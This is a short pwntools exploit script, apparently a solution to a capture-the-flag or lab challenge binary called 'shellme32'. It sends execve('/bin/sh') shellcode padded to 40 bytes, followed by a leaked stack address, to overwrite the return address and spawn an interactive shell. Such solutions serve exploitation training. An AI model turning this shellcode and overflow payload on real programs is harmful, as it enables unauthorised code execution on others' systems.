from pwn import *

e = ELF('./shellme32')
p = process('./shellme32')

shellcode =  "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

print p.recvuntil('?\n')
res = int(p.recvuntil('\n'),16)
print p.recvuntil('>')

#binsh_addr = next(e.search("/bin/sh")) #0xf7f5342d

payload = shellcode
payload += 'A'*(40-len(shellcode))
payload += p32(res)
#payload += p32(res)
#payload += 'AAAA'
#payload += p32(binsh_addr)
p.sendline(payload)
p.interactive()
print p.recv()